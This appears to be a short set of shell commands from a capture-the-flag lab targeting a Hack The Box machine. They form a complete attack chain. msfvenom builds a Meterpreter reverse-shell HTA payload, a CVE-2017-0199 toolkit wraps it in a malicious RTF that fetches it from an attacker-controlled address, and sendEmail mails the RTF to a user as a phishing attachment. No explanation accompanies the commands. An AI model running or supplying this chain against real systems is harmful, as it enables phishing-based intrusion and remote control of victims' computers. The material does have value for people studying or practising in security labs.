msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=1470 -f hta-psh -o g7.hta
python2 cve-2017-0199_toolkit.py -M gen -w g7.rtf -u http://10.10.14.39/g7.hta -t RTF -x 0
./sendEmail -f g7@glat.htb -t nico@megabank.com -u "glatisant" -m "glatisant" -a g7.rtf -s 10.10.10.77 -v

